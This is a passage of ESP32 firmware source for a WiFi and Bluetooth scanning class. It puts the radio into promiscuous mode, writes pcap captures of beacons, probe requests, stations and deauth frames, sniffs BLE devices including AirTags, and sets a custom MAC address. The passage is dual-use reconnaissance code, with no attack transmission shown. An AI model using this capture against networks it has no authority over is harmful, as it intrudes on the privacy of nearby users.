      const AccessPoint& ap = access_points->get(i);
      JsonObject jsonAp = jsonArray.createNestedObject();
      jsonAp["essid"] = ap.essid;
      jsonAp["channel"] = ap.channel;

      char bssidStr[18];
      sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
              ap.bssid[0], ap.bssid[1], ap.bssid[2],
              ap.bssid[3], ap.bssid[4], ap.bssid[5]);
      jsonAp["bssid"] = bssidStr;
    }

    String jsonString;
    serializeJson(jsonArray, jsonString);

    buffer_obj.append(jsonString);

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Saved APs: ");
      display_obj.tft.println((String)access_points->size());
    #endif
    Serial.print("Saved APs:");
    Serial.println((String)access_points->size());
  }
}

// Function to start running a beacon scan
void WiFiBleScan::RunAPScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("ap");

  Serial.println(text_table4[9] + (String)access_points->size());
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[44],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  delete access_points;
  access_points = new LinkedList<AccessPoint>();

  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  //if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
  //else
  //  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

#ifdef HAS_SCREEN
  void WiFiBleScan::RunLvJoinWiFi(uint8_t scan_mode, uint16_t color) {
  
    display_obj.tft.init();
    display_obj.tft.setRotation(3); //default 1
    
    #ifdef TFT_SHIELD
      uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
      Serial.println("Using TFT Shield");
    #else if defined(TFT_DIY)
      //uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
      uint16_t calData[5] = { 250, 3470, 237, 3700, 7 }; //by s
      Serial.println("Using TFT DIY");
    #endif
    #ifdef HAS_ILI9341
      display_obj.tft.setTouch(calData);
    #endif
    
  
    lv_obj_t * scr = lv_cont_create(NULL, NULL);
    lv_disp_load_scr(scr);
  
  }
#endif

void WiFiBleScan::RunClearStations() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[45]));
    display_obj.tft.println(text_table4[46] + (String)this->clearStations());
  #else
    this->clearStations();
  #endif
}

void WiFiBleScan::RunClearAPs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[9]));
    display_obj.tft.println(text_table4[10] + (String)this->clearAPs());
    display_obj.tft.println(F(text_table4[45]));
    display_obj.tft.println(text_table4[46] + (String)this->clearStations());
  #else
    this->clearAPs();
    this->clearStations();
  #endif
}

void WiFiBleScan::RunClearSSIDs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[11]));
    display_obj.tft.println(text_table4[12] + (String)this->clearSSIDs());
  #else
    this->clearSSIDs();
  #endif
}

void WiFiBleScan::RunGenerateSSIDs(int count) {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[13]));
  
    display_obj.tft.println(text_table4[14] + (String)this->generateSSIDs());
    display_obj.tft.println(text_table4[15] + (String)ssids->size());
  #else
    this->generateSSIDs(count);
  #endif
}

void WiFiBleScan::RunGPSInfo() {
  #ifdef HAS_GPS
    String text=gps_obj.getText();

    Serial.println("Refreshing GPS Data on screen...");
    #ifdef HAS_SCREEN

      // Get screen position ready
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);

      // Clean up screen first
      //display_obj.tft.fillRect(0, 0, 240, STATUS_BAR_WIDTH, STATUSBAR_COLOR);
      display_obj.tft.fillRect(0, (SCREEN_HEIGHT / 3) - 6, SCREEN_WIDTH, SCREEN_HEIGHT - ((SCREEN_HEIGHT / 3) - 6), TFT_BLACK);

      // Print the GPS data: 3
      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
      if (gps_obj.getFixStatus())
        display_obj.tft.println("  Good Fix: Yes");
      else
        display_obj.tft.println("  Good Fix: No");
        
      if(text != "") display_obj.tft.println("      Text: " + text);

      display_obj.tft.println("Satellites: " + gps_obj.getNumSatsString());
      display_obj.tft.println("  Accuracy: " + (String)gps_obj.getAccuracy());
      display_obj.tft.println("  Latitude: " + gps_obj.getLat());
      display_obj.tft.println(" Longitude: " + gps_obj.getLon());
      display_obj.tft.println("  Altitude: " + (String)gps_obj.getAlt());
      display_obj.tft.println("  Datetime: " + gps_obj.getDatetime());
    #endif

    // Display to serial
    Serial.println("==== GPS Data ====");
    if (gps_obj.getFixStatus())
      Serial.println("  Good Fix: Yes");
    else
      Serial.println("  Good Fix: No");
      
    if(text != "") Serial.println("      Text: " + text);

    Serial.println("Satellites: " + gps_obj.getNumSatsString());
    Serial.println("  Accuracy: " + (String)gps_obj.getAccuracy());
    Serial.println("  Latitude: " + gps_obj.getLat());
    Serial.println(" Longitude: " + gps_obj.getLon());
    Serial.println("  Altitude: " + (String)gps_obj.getAlt());
    Serial.println("  Datetime: " + gps_obj.getDatetime());
  #endif
}

void WiFiBleScan::RunGPSNmea() {
  #ifdef HAS_GPS
    LinkedList<nmea_sentence_t> *buffer=gps_obj.get_queue();
    bool queue_enabled=gps_obj.queue_enabled();

    String gxgga = gps_obj.generateGXgga();
    String gxrmc = gps_obj.generateGXrmc();

    if(!buffer||!queue_enabled)
      gps_obj.flush_queue();
    #ifndef HAS_SCREEN
      else
        gps_obj.flush_text();
    #else
      // Get screen position ready
      int offset=100;
      if((SCREEN_HEIGHT / 3)<offset)
        offset=SCREEN_HEIGHT/3; //for smaller screens
      if(offset<(TOP_FIXED_AREA+6))
        offset=TOP_FIXED_AREA+6; //absolute minimium
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, offset);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_GREEN);

      // Clean up screen first
      display_obj.tft.fillRect(0, offset-6, SCREEN_WIDTH, SCREEN_HEIGHT - (offset-6), TFT_BLACK);

      #ifdef GPS_NMEA_SCRNLINES
        int lines=GPS_NMEA_SCRNLINES;
      #else
        int lines=TEXT_HEIGHT;
        if(lines>((TFT_HEIGHT-offset-BOT_FIXED_AREA)/10))
          lines=(TFT_HEIGHT-offset-BOT_FIXED_AREA)/10;
      #endif

      String text=gps_obj.getText();
      if(queue_enabled){
        int queue=gps_obj.getTextQueueSize();
        if(queue>0){
          display_obj.tft.println(gps_obj.getTextQueue());
          lines-=queue; //used lines for text display
        }
        else
          if(text != ""){
            display_obj.tft.println(text);
            lines--;
          }
      }
      else
        if(text != ""){
          display_obj.tft.println(text);
          lines--;
        }

      #if GPS_NMEA_SCRNWRAP
        lines-=((gxgga.length()-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
        lines-=((gxrmc.length()-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
        display_obj.tft.setTextWrap(GPS_NMEA_SCRNWRAP);
      #else
        lines-=2; //two self-genned messages
      #endif
    #endif

    if(buffer && queue_enabled){
      int size=buffer->size();
      if(size){
        gps_obj.new_queue();
        for(int i=0;i<size;i++){
          nmea_sentence_t line=buffer->get(i);
          Serial.println(line.sentence);

          #ifdef HAS_SCREEN
            if(lines>0){
              if(line.unparsed){
                if(line.type != "" && line.type != "TXT" && line.type != "GGA" && line.type != "RMC"){
                  int length=line.sentence.length();
                  if(length){
                    #if GPS_NMEA_SCRNWRAP
                      if((((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1)<=lines){
                    #endif
                        display_obj.tft.println(line.sentence);
                        #if GPS_NMEA_SCRNWRAP
                          lines-=((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1;
                        #else
                          lines--;
                        #endif
                    #if GPS_NMEA_SCRNWRAP
                      }
                    #endif
                  }
                }
              }
            }
          #endif
        }
        delete buffer;
      }
    } else {
      static String old_nmea_sentence="";
      String nmea_sentence=gps_obj.getNmeaNotimp();

      if(nmea_sentence != "" && nmea_sentence != old_nmea_sentence){
        old_nmea_sentence=nmea_sentence;
        Serial.println(nmea_sentence);
      }

      #ifdef HAS_SCREEN
        if(lines>0){
          String display_nmea_sentence=gps_obj.getNmeaNotparsed();
          int length=display_nmea_sentence.length();
          if(length)
            #if GPS_NMEA_SCRNWRAP
              if((((length-1)/STANDARD_FONT_CHAR_LIMIT) + 1)<=lines)
            #endif
                display_obj.tft.println(display_nmea_sentence);
        }
      #endif
    }

    #ifdef HAS_SCREEN
      display_obj.tft.println(gxgga);
      display_obj.tft.println(gxrmc);
      #if GPS_NMEA_SCRNWRAP
        display_obj.tft.setTextWrap(false);
      #endif
    #endif

    gps_obj.sendSentence(Serial, gxgga.c_str());
    gps_obj.sendSentence(Serial, gxrmc.c_str());

  #endif
}

void WiFiBleScan::RunInfo()
{
  String sta_mac = this->getStaMAC();
  String ap_mac = this->getApMAC();
  String free_ram = this->freeRAM();

  Serial.println(free_ram);

  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
    display_obj.tft.println(text_table4[20]);
    display_obj.tft.println(text_table4[21] + display_obj.version_number);
    display_obj.tft.println("Hardware: " + (String)HARDWARE_NAME);
    display_obj.tft.println(text_table4[22] + (String)esp_get_idf_version());
  #endif

  if (this->wsl_bypass_enabled) {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[23]);
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[24]);
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.tft.println(text_table4[25] + sta_mac);
    display_obj.tft.println(text_table4[26] + ap_mac);
    display_obj.tft.println(text_table4[27] + free_ram);
  #endif

  #if defined(HAS_SD)
    if (sd_obj.supported) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[28]);
        display_obj.tft.print(text_table4[29]);
        display_obj.tft.print(sd_obj.card_sz);
        display_obj.tft.println("MB");
      #endif
    } else {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[30]);
        display_obj.tft.println(text_table4[31]);
      #endif
    }
  #endif

  #ifdef HAS_BATTERY
    battery_obj.battery_level = battery_obj.getBatteryLevel();
    if (battery_obj.i2c_supported) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[32]);
        display_obj.tft.println(text_table4[33] + (String)battery_obj.battery_level + "%");
      #endif
    }
    else {
      #ifdef HAS_SCREEN
        display_obj.tft.println(text_table4[34]);
      #endif
    }
  #endif
  
  //#ifdef HAS_SCREEN
  //  display_obj.tft.println(text_table4[35] + (String)temp_obj.current_temp + " C");
  //#endif
}

void WiFiBleScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
{
  startPcap("packet_monitor");

  #ifdef HAS_ILI9341
    
    #ifdef HAS_SCREEN
      display_obj.tft.init();
      //display_obj.tft.setRotation(1);//default
      display_obj.tft.setRotation(3); // by s

      //uint16_t calData[5] = { 250, 3470, 237, 3700, 7 };  //tuned by s, for rotation 3, 1st is x offset 2nd is x scale, 3rd is y offset 4th is y scale
      //display_obj.tft.setTouch(calData);
    
      display_obj.tft.fillScreen(TFT_BLACK);
    #endif
  
    #ifdef HAS_SCREEN
      #ifdef TFT_SHIELD
        uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
        Serial.println("Using TFT Shield");
      #else if defined(TFT_DIY)
        //uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY default
        uint16_t calData[5] = { 250, 3470, 237, 3700, 7 };  //tuned by s, for rotation 3, 1st is x offset 2nd is x scale, 3rd is y offset 4th is y scale
        Serial.println("Using TFT DIY");
      #endif
      display_obj.tft.setTouch(calData);
    
      //display_obj.tft.setFreeFont(1);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setTextSize(1);
      display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
      display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
    
      delay(10);
    
      display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
      display_obj.tftDrawColorKey();
      display_obj.tftDrawXScaleButtons(x_scale);
      display_obj.tftDrawYScaleButtons(y_scale);
      display_obj.tftDrawChannelScaleButtons(set_channel);
      display_obj.tftDrawExitScaleButtons();
    #endif
  #else
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_WHITE, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table1[45],120,16,2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
    #endif
  #endif

  Serial.println("Running packet scan...");
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  uint32_t initTime = millis();
}

void WiFiBleScan::setBaseMacAddress(uint8_t macAddr[6]) {
  // Use ESP-IDF function to set the base MAC address
  esp_err_t err = esp_base_mac_addr_set(macAddr);

  // Check for success or handle errors
  if (err == ESP_OK) {
    return;
  } else if (err == ESP_ERR_INVALID_ARG) {
    Serial.println("Error: Invalid MAC address argument.");
  } else {
    Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
  }
}

// Function to start running a beacon scan
void WiFiBleScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_AP)
    startPcap("beacon");

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode == WIFI_SCAN_AP)
        display_obj.tft.drawCentreString(text_table4[38],120,16,2);

      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiBleScan::RunStationScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("station");
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table1[59],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiBleScan::RunRawScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode != WIFI_SCAN_SIG_STREN)
    startPcap("raw");
      
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode != WIFI_SCAN_SIG_STREN)
        display_obj.tft.drawCentreString(text_table1[58],120,16,2);
      else
        display_obj.tft.drawCentreString("Signal Monitor", 120, 16, 2);
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&rawSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiBleScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("deauth");
    
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[39],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function for running probe request scan
void WiFiBleScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_PROBE)
    startPcap("probe");
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[40],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

// Function to start running any BLE scan
void WiFiBleScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_BT
    #ifdef HAS_SCREEN
      display_obj.print_delay_1 = 50;
      display_obj.print_delay_2 = 20;
    #endif
  
      NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
      NimBLEDevice::setScanDuplicateCacheSize(200);
    
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER))
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        #ifdef HAS_FULL_SCREEN
          display_obj.tft.fillRect(0,16,240,16, color);
          if (scan_mode == BT_SCAN_ALL)
            display_obj.tft.drawCentreString(text_table4[41],120,16,2);
          else if (scan_mode == BT_SCAN_AIRTAG)
            display_obj.tft.drawCentreString("Airtag Sniff",120,16,2);
          else if (scan_mode == BT_SCAN_FLIPPER)
            display_obj.tft.drawCentreString("Flipper Sniff", 120, 16, 2);
          #ifdef HAS_ILI9341
            display_obj.touchToExit();
          #endif
        #endif
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      if (scan_mode == BT_SCAN_ALL)
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
      else if (scan_mode == BT_SCAN_AIRTAG) {
        this->clearAirtags();
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
      }
      else if (scan_mode == BT_SCAN_FLIPPER) {
        this->clearFlippers();
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
      }
    }
    pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);  // less or equal setInterval value
    pBLEScan->setMaxResults(0);
    pBLEScan->start(0, scanCompleteCB, false);
    Serial.println("Started BLE Scan");
    this->ble_initialized = true;

    initTime = millis();
  #endif
}

// Function that is called when BLE scan is completed
#ifdef HAS_BT
  void WiFiBleScan::scanCompleteCB(BLEScanResults scanResults) {
    printf("Scan complete!\n");
    printf("Found %d devices\n", scanResults.getCount());
    scanResults.dump();
  } // scanCompleteCB
#endif

// Function to extract MAC addr from a packet at given offset
void WiFiBleScan::getMAC(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

void WiFiBleScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type) {  
  extern WiFiBleScan wifi_ble_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        //delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        //display_string.concat(addr);
        //Serial.print(" ESSID: ");
        //display_string.concat(" -> ");
        //for (int i = 0; i < snifferPacket->payload[37]; i++)
        //{
        //  Serial.print((char)snifferPacket->payload[i + 38]);
        //  display_string.concat((char)snifferPacket->payload[i + 38]);
        //  essid.concat((char)snifferPacket->payload[i + 38]);
        //}
        #ifdef HAS_FULL_SCREEN
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");
          display_string.concat(snifferPacket->rx_ctrl.channel);
          display_string.concat(" ");
        #endif

        Serial.print(" ESSID: ");
        if (snifferPacket->payload[37] <= 0)
          display_string.concat(addr);
        else {
          for (int i = 0; i < snifferPacket->payload[37]; i++)
          {
            Serial.print((char)snifferPacket->payload[i + 38]);
            display_string.concat((char)snifferPacket->payload[i + 38]);
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          //if (display_obj.display_buffer->size() == 0)
          //{
          //display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          //display_obj.loading = false;
          //}
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }

        //LinkedList<char> beacon = new LinkedList<char>();
        
        /*AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL};*/

        AccessPoint ap;
        ap.essid = essid;
        ap.channel = snifferPacket->rx_ctrl.channel;
        ap.bssid[0] = snifferPacket->payload[10];
        ap.bssid[1] = snifferPacket->payload[11];
        ap.bssid[2] = snifferPacket->payload[12];
        ap.bssid[3] = snifferPacket->payload[13];
        ap.bssid[4] = snifferPacket->payload[14];
        ap.bssid[5] = snifferPacket->payload[15];
        ap.selected = false;
        ap.stations = new LinkedList<uint8_t>();
        
        ap.beacon = new LinkedList<char>();

        //for (int i = 0; i < len; i++) {
        //  ap.beacon->add(snifferPacket->payload[i]);
